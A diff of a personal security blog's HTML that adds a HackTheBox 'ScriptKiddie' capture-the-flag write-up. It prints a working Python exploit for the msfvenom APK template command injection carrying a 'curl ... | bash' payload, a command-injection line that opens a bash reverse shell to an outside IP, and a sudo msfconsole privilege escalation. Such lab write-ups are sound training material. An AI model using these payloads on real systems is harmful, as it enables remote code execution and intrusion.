@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Welcome to my personal Security blog!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
 
   
 
@@ -276,8 +276,6 @@
   
 
   
-    <link rel="alternate" href="/writeups/index.xml" type="application/rss+xml" title="Mohamed ELLEUCH" />
-  
 
   
     <link rel="manifest" href="/index.webmanifest" />
@@ -286,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
 
   
   
@@ -296,20 +294,23 @@
   
   
     
-    
   
   
-  <meta property="twitter:card" content="summary" />
+  <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/" />
-  <meta property="og:title" content="Writeups | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Welcome to my personal Security blog!" /><meta property="og:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" />
+  <meta property="og:title" content="HackTheBox - ScriptKiddie Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-scriptkiddie/featured.png" /><meta property="og:locale" content="en-us" />
   
     
-      <meta property="og:updated_time" content="2021-06-05T00:00:00&#43;00:00" />
+      <meta
+        property="article:published_time"
+        content="2021-06-05T00:00:00&#43;00:00"
+      />
     
+    <meta property="article:modified_time" content="2021-06-05T00:00:00&#43;00:00">
   
 
   
@@ -320,11 +321,13 @@
 
   
 
+  
 
 
 
 
-  <title>Writeups | Mohamed ELLEUCH</title>
+
+  <title>HackTheBox - ScriptKiddie Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -588,6 +591,211 @@
   </div>
 
   <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - ScriptKiddie Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Jun 5, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 596px; max-height: 365px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-scriptkiddie/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.226 -v
+</code></pre>
+<pre><code class="language-bash">Discovered open port 22/tcp on 10.10.10.226
+Discovered open port 5000/tcp on 10.10.10.226
+</code></pre>
+<img src="nmap.png">
+<p>We have two ports open</p>
+<ul>
+<li>22/SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</li>
+<li>5000/HTTP :  Werkzeug httpd 0.16.1</li>
+</ul>
+<p>&ndash;&gt; Service versions seem to be up-to-date, we don&rsquo;t really focus on them</p>
+<h2 id="p-stylecolorgreenweb-server-p"><p style="color:Green">Web Server </p></h2>
+<img src="web.png">
+<p>&ndash;&gt; We have so many user inputs, first thing we should check if there is any command injections as it seem to be using linux binaries which can lead to RCE</p>
+<img src="web1.png">
+<img src="web2.png">
+<img src="web3.png">
+<p>&ndash;&gt; It seems that the input is hardcoded, taking into considerating that this is an easy box i don&rsquo;t that we should try to bypass these filters and just move on</p>
+<h1 id="p-stylecolorredfoothold--user-flag-p"><p style="color:RED">Foothold &amp; User flag </p></h1>
+<hr>
+<p>Another interesting thing is the file upload that takes a msfvenom template!</p>
+<p>Searching a bit in google can lead us to what we want! We can craft a Android payload template and get a shell on the box</p>
+<blockquote>
+<p><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a></p>
+</blockquote>
+<p>Payload:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import subprocess
+import tempfile
+import os
+from base64 import b32encode
+
+payload = 'curl http://10.10.14.54:1337/x|bash'
+
+
+payload_b32 = b32encode(payload.encode()).decode()
+dname = f&quot;CN='|echo {payload_b32} | base32 -d | sh #&quot;
+
+print(f&quot;[+] Manufacturing evil apkfile&quot;)
+print(f&quot;Payload: {payload}&quot;)
+print(f&quot;-dname: {dname}&quot;)
+print()
+
+tmpdir = tempfile.mkdtemp()
+apk_file = os.path.join(tmpdir, &quot;evil.apk&quot;)
+empty_file = os.path.join(tmpdir, &quot;empty&quot;)
+keystore_file = os.path.join(tmpdir, &quot;signing.keystore&quot;)
+storepass = keypass = &quot;password&quot;
+key_alias = &quot;signing.key&quot;
+
+# Touch empty_file
+open(empty_file, &quot;w&quot;).close()
+
+# Create apk_file
+subprocess.check_call([&quot;zip&quot;, &quot;-j&quot;, apk_file, empty_file])
+
+# Generate signing key with malicious -dname
+subprocess.check_call([&quot;keytool&quot;, &quot;-genkey&quot;, &quot;-keystore&quot;, keystore_file, &quot;-alias&quot;, key_alias, &quot;-storepass&quot;, storepass,
+                       &quot;-keypass&quot;, keypass, &quot;-keyalg&quot;, &quot;RSA&quot;, &quot;-keysize&quot;, &quot;2048&quot;, &quot;-dname&quot;, dname])
+
+# Sign APK using our malicious dname
+subprocess.check_call([&quot;jarsigner&quot;, &quot;-sigalg&quot;, &quot;SHA1withRSA&quot;, &quot;-digestalg&quot;, &quot;SHA1&quot;, &quot;-keystore&quot;, keystore_file,
+                       &quot;-storepass&quot;, storepass, &quot;-keypass&quot;, keypass, apk_file, key_alias])
+
+print()
+print(f&quot;[+] Done! apkfile is at {apk_file}&quot;)
+print(f&quot;Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&quot;)
+
+</code></pre>
+<p>Let&rsquo;s execute the apk file</p>
+<img src="apk.png">
+<img src="ff.png">
+And set a listener to get a reverse shell on the box
+<img src="rev1.png">
+<p>Let&rsquo;s stabilize our shell</p>
+<img src="stable.png">
+<h1 id="p-stylecolorred-2nd-user--root-flag-p"><p style="color:RED"> 2nd USER &amp; Root Flag </p></h1>
+<hr>
+<p>Looking a bit in the files, we can find an interesting file owned by pwn user!</p>
+<img src="pwn.png">
+<p>Basically it takes the ips from the hackers file and run nmap on it!</p>
+<p>The idea is to inject a malicious command instead of an ip</p>
+<pre><code class="language-bash">echo &quot;  ;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1' #&quot; &gt;&gt;hackers
+</code></pre>
+<blockquote>
+<p>We should add two spaces because of the | cut -d' ' -f3- |</p>
+</blockquote>
+<img src="we.png">
+<p>We got a shell as the user pwn!</p>
+<p>Let&rsquo;s check if he can run anything as sudo</p>
+<img src="sudo.png">
+<p>We can run msfconsole as root! basically a free win :D!</p>
+<pre><code class="language-bash">sudo /opt/metasploit-framework-6.0.9/msfconsole
+</code></pre>
+<img src="root.png">
+<p>And we can execute commands as root</p>
+<img src="root1.png">
+<p>And we rooted the box!</p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
     
 
 
@@ -595,134 +803,228 @@
 
 
 
-
-
-
-
-
-
+<div class="article-tags">
   
-
-  
-  
-  
-    
-  
-<div class="universal-wrapper pt-3">
-  <h1>Writeups</h1>
-
-  
-
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
   
 </div>
 
 
 
-<div class="universal-wrapper">
-  
-
-  
-  
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-scriptkiddie/" >HackTheBox - ScriptKiddie Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine ScriptKiddie, Which is an Easy Linux machine!
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;text=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;t=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-ready/" >HackTheBox - Ready Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Ready, Which is a Medium Linux machine!
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20ScriptKiddie%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;title=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/ct-crashed/" >CyberTalents - Crashed Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the Hard rated machine Crashed from Cybertalents
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20ScriptKiddie%20Writeup%20https://mohamed-elleuch.me/writeups/htb-scriptkiddie/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-scriptkiddie/&amp;title=HackTheBox%20-%20ScriptKiddie%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-laboratory/" >HackTheBox - Laboratory Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-luanne/" >HackTheBox - Luanne Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Luanne, Which is an Easy NetBSD machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-passage/" >HackTheBox - Passage Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-academy/" >HackTheBox - Academy Writeup</a></h2>
-      <div class="article-style">
-        
-          Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations
-        
-      </div>
-    </div>
-  
-    
-    
-    
-    <div>
-      <h2><a href="/writeups/hacklockad/" >HackLock Active Directory Workshop Writeup</a></h2>
-      <div class="article-style">
-        
-          I had the chance to participate in the hacklock event organized by Securinets and also win \o/. Here's the writeup that i presented in front of the jury.
-        
-      </div>
-    </div>
-  
-
-  
-
+  </ul>
 </div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
   </div>
 
   <div class="page-footer">
